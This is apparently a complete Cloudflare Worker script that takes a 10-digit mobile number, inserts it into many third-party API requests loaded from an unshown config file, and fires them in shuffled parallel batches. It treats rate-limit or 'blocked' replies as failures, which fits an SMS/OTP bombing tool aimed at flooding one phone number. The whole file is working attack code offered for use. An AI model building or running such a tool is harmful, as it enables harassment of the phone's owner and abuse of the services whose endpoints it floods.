import apisConfig from './nana.json';

// ============================================================
// HELPER FUNCTIONS
// ============================================================
function isRealSuccess(data) {
  if (!data || typeof data !== 'object') return false;
  if (data.dry) return false;
  if (data.authorize && data.authorize !== '0') return false;
  if (data.error) return false;
  if (data.message && /frequent|try again|blocked|invalid/i.test(data.message)) return false;
  return true;
}

function interpolate(obj, mobile) {
  const num = String(parseInt(mobile, 10));
  if (typeof obj === 'string') {
    return obj.replace(/\{\{mobileNum\}\}/g, num).replace(/\{\{mobile\}\}/g, mobile);
  }
  if (Array.isArray(obj)) return obj.map(v => interpolate(v, mobile));
  if (obj && typeof obj === 'object') {
    const out = {};
    for (const k in obj) out[k] = interpolate(obj[k], mobile);
    return out;
  }
  return obj;
}

function withTimeout(promise, ms) {
  return Promise.race([
    promise,
    new Promise((_, reject) => setTimeout(() => reject(new Error(`Timeout after ${ms}ms`)), ms))
  ]);
}

function json(obj, status = 200) {
  return new Response(JSON.stringify(obj, null, 2), {
    status,
    headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
  });
}

// ============================================================
// SINGLE API RUNNER
// ============================================================
async function runOne(key, cfg, mobile) {
  const start = Date.now();
  const url     = interpolate(cfg.url, mobile);
  const headers = interpolate(cfg.headers || {}, mobile);
  const method  = (cfg.method || 'GET').toUpperCase();
  const timeout = cfg.timeout || 8000;

  let body = undefined;
  if (cfg.bodyRaw) {
    body = interpolate(cfg.bodyRaw, mobile);
  } else if (cfg.body) {
    if (typeof cfg.body === 'string') body = interpolate(cfg.body, mobile);
    else body = JSON.stringify(interpolate(cfg.body, mobile));
  }

  try {
    const fetchPromise = fetch(url, { method, headers, body }).then(async res => {
      const text = await res.text();
      let data; try { data = JSON.parse(text); } catch { data = text; }
      return { status: res.status, data };
    });

    const { status, data } = await withTimeout(fetchPromise, timeout);

    return {
      api: key,
      name: cfg.name || key,
      success: status === 200 && isRealSuccess(data),
      status,
      ms: Date.now() - start,
      response: data
    };
  } catch (e) {
    return { api: key, name: cfg.name || key, success: false, error: e.message, ms: Date.now() - start };
  }
}

// ============================================================
// WORKER ENTRY POINT (RANDOM & AUTO-BATCH)
// ============================================================
export default {
  async fetch(request) {
    const url = new URL(request.url);
    const mobile = url.searchParams.get('mobile');

    // CORS Handle
    if (request.method === 'OPTIONS') {
      return new Response(null, {
        headers: { 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Methods': 'GET, OPTIONS', 'Access-Control-Allow-Headers': '*' }
      });
    }

    if (!mobile) return json({ error: 'Missing ?mobile' }, 400);
    const clean = mobile.replace(/\D/g, '');
    if (clean.length !== 10) return json({ error: 'Mobile must be exactly 10 digits' }, 400);

    const start = Date.now();
    
    // 1. Saari APIs ko array mein lo
    const allApis = Object.entries(apisConfig);
    
    // 2. Unhe random (shuffle) kar do
    const shuffledApis = allApis.sort(() => 0.5 - Math.random());
    
    // 3. Batch size set karo (45 is safe for Cloudflare's 50 limit)
    const chunkSize = 45; 
    const allResults = [];

    // 4. Loop chalao 45-45 karke
    for (let i = 0; i < shuffledApis.length; i += chunkSize) {
      const chunk = shuffledApis.slice(i, i + chunkSize);
      
      // Har chunk ko parallel run karo
      const settled = await Promise.allSettled(
        chunk.map(([k, c]) => runOne(k, c, clean))
      );

      const chunkResults = settled.map(r => 
        r.status === 'fulfilled' ? r.value : { success: false, error: r.reason?.message }
      );

      allResults.push(...chunkResults);
    }

    const successCount = allResults.filter(r => r.success).length;

    // Final Response
    return json({
      mobile: clean,
      total: allResults.length,
      success: successCount,
      failed: allResults.length - successCount,
      totalTimeMs: Date.now() - start,
      results: allResults
    });
  }
};
